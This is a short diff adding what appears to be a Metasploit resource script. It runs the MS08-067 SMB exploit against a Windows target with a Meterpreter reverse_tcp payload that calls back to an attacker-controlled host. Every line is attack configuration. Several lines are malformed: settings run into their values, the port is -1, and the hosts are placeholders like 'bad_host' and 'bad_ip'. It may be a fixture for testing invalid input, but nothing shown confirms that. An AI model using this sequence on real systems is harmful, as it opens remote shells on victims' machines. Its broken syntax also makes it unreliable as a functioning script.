@@ -1,0 +1,6 @@
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTbad_host
+set payloadwindows/meterpreter/reverse_tcp
+set LPORT-1
+set LHOSTbad_ip
+exploit -j -z
